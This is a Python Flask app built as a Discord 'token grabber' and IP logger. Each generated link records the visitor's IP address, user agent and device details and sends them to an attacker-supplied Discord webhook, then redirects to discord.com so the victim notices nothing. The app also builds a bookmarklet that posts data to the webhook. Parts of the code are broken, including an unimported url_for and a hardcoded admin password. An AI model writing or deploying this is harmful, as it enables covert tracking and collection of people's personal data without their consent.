from flask import Flask, request, render_template_string, redirect, jsonify
from dhooks import Webhook, Embed
import os
import json
import random
import string
import user_agents
import urllib.parse

app = Flask(__name__)

# Path to store user data (webhooks and token-related files)
webhooks_data_file = "webhooks_data.json"

# Load existing data if the file exists
if os.path.exists(webhooks_data_file):
    with open(webhooks_data_file, "r") as f:
        webhooks_data = json.load(f)
else:
    webhooks_data = {}

# Helper function to generate a unique token ID
def generate_token_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

# Function to extract the real client IP address
def get_client_ip():
    if 'X-Forwarded-For' in request.headers:
        return request.headers.getlist('X-Forwarded-For')[0]
    else:
        return request.remote_addr

# Route to create a new token route and store the webhook URL
@app.route('/create', methods=['GET', 'POST'])
def create():
    if request.method == 'POST':
        name = request.form['name']
        webhook_url = request.form['webhook_url']

        if not name or not webhook_url:
            return "Please provide both a name and a webhook URL.", 400

        # Check if the name is already taken
        if name in webhooks_data:
            return render_template_string("""
                <h1>Oops! This name is already taken. Please choose another one.</h1>
                <a href="/create">Go Back</a>
            """)

        # Get user's IP address and parse their user agent
        user_ip = get_client_ip()

        # Parse the user agent to get device information
        user_agent = request.headers.get('User-Agent')
        ua = user_agents.parse(user_agent)

        # Generate a unique token ID for the user
        token_id = generate_token_id()

        # Store the user's webhook, token ID, IP address, and user agent data
        webhooks_data[name] = {
            'webhook_url': webhook_url,
            'token_id': token_id,
            'ip_address': user_ip,
            'user_agent': user_agent,  
            'device_info': {
                'device': ua.device,
                'os': ua.os.family,
                'browser': ua.browser.family,
                'os_version': ua.os.version,
                'device_type': ua.device.family,
            }
        }

        # Save the data back to the file
        with open(webhooks_data_file, "w") as f:
            json.dump(webhooks_data, f)

        # Send the embed with the token URL and code to the user's webhook
        hook = Webhook(webhook_url)
        embed = Embed(
            title="New Token Created 🎉",
            description="Here is your new token grabbing link:",
            color=0x00ff00
        )
        embed.add_field(name="🔗 Token URL", value=f"https://yourdomain.com/{token_id}", inline=False)
        embed.add_field(name="💬 Code", value=f"```{token_id}```", inline=False)
        hook.send(embed=embed)

        # Generate the bookmarklet
        bookmarklet_code = f"javascript:fetch('{url_for('grab_token', token_id=token_id, _external=True)}', {{ method: 'GET' }}).then(response => response.text()).then(data => {{ fetch('{webhook_url}', {{ method: 'POST', body: JSON.stringify({{ token_id: '{token_id}', ip: '{user_ip}', user_agent: '{user_agent}' }}), headers: {{ 'Content-Type': 'application/json' }} }}); }});"

        # Return the unique link and bookmarklet
        return render_template_string("""
            <h1>Token Created Successfully!</h1>
            <p>Your unique token URL: <a href="/{{ token_id }}">{{ token_id }}</a></p>
            <p>Visit your settings page to manage your webhook: <a href="/settings/{{ name }}">Go to Settings</a></p>
            <p>Click on the bookmarklet below to send token info to your webhook:</p>
            <a href="javascript:{{ bookmarklet_code }}" id="bookmarklet">Click Here</a>
            <script>
                document.getElementById('bookmarklet').innerText = "Bookmark this link!";
            </script>
        """, token_id=token_id, name=name, webhook_url=webhook_url, bookmarklet_code=urllib.parse.quote(bookmarklet_code))

    return render_template_string("""
        <h1>Create Webhook</h1>
        <form method="POST">
            <label for="name">Webhook Name:</label><br>
            <input type="text" id="name" name="name" required><br><br>
            <label for="webhook_url">Webhook URL:</label><br>
            <input type="text" id="webhook_url" name="webhook_url" required><br><br>
            <input type="submit" value="Create">
        </form>
    """)

# Password protection for /seeall route
@app.route('/seeall', methods=['GET', 'POST'])
def see_all():
    password = 'James'

    if request.method == 'POST':
        entered_password = request.form['password']
        if entered_password == password:
            if not webhooks_data:
                return "No tokens grabbed yet.", 200

            return render_template_string("""
                <h1>Grabbed Tokens</h1>
                <ul>
                    {% for name, data in webhooks_data.items() %}
                        <li>
                            <strong>{{ name }}</strong>: {{ data['webhook_url'] }}
                            <br>
                            Token ID: {{ data['token_id'] }}
                            <br>
                            Token URL: <a href="/{{ data['token_id'] }}">{{ data['token_id'] }}</a>
                            <br>
                            <a href="/settings/{{ name }}">Go to Settings</a>
                        </li>
                    {% endfor %}
                </ul>
            """, webhooks_data=webhooks_data)

        else:
            return "Invalid password.", 403

    return render_template_string("""
        <h1>Enter Password</h1>
        <form method="POST">
            <label for="password">Password:</label><br>
            <input type="password" id="password" name="password" required><br><br>
            <input type="submit" value="Enter">
        </form>
    """)

# Route for each token to grab and send information to the webhook
@app.route('/<string:token_id>')
def grab_token(token_id):
    # Find the user based on the token ID
    user = None
    for name, data in webhooks_data.items():
        if data['token_id'] == token_id:
            user = name
            webhook_url = data['webhook_url']
            stored_ip = data['ip_address']  
            break

    if not user:
        return "Invalid token ID.", 404

    # Get client's IP address
    client_ip = get_client_ip()

    # Check if the stored IP matches the client's IP
    if client_ip != stored_ip:
        return "Access denied. Your IP address doesn't match the stored IP address.", 403

    # Get client information
    user_agent = request.headers.get('User-Agent')
    ua = user_agents.parse(user_agent)

    # Create the embed message with more detailed user information
    embed = Embed(
        title="Token grabbed 🎉",
        description=f"Details for token: {token_id}",
        color=0x00ff00
    )

    embed.add_field(name="📜 Token", value=token_id, inline=False)
    embed.add_field(name="🌍 IP Address", value=client_ip, inline=False)
    embed.add_field(name="🖥️ User Agent", value=user_agent, inline=False)
    embed.add_field(name="🔗 Device Info", value=f"{ua.device} ({ua.os.family} {ua.os.version})", inline=False)

    # Send the embed to the Discord webhook
    hook = Webhook(webhook_url)
    hook.send(embed=embed)

    return redirect("https://discord.com/app")

# Settings page for each user to manage their webhook and view their token code
@app.route('/settings/<string:name>', methods=['GET', 'POST'])
def settings(name):
    if name not in webhooks_data:
        return "User not found.", 404

    webhook_url = webhooks_data[name]['webhook_url']
    token_id = webhooks_data[name]['token_id']

    if request.method == 'POST':
        new_webhook_url = request.form['webhook_url']
        if new_webhook_url:
            webhooks_data[name]['webhook_url'] = new_webhook_url
            with open(webhooks_data_file, "w") as f:
                json.dump(webhooks_data, f)
            return f"Webhook URL updated successfully for {name}."

    return render_template_string("""
        <h1>{{ name }}'s Settings</h1>
        <p>Token ID: {{ token_id }}</p>
        <p>Webhook URL: {{ webhook_url }}</p>
        <form method="POST">
            <label for="webhook_url">Update Webhook URL:</label><br>
            <input type="text" id="webhook_url" name="webhook_url" required><br><br>
            <input type="submit" value="Update Webhook">
        </form>
    """, name=name, webhook_url=webhook_url, token_id=token_id)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=81)
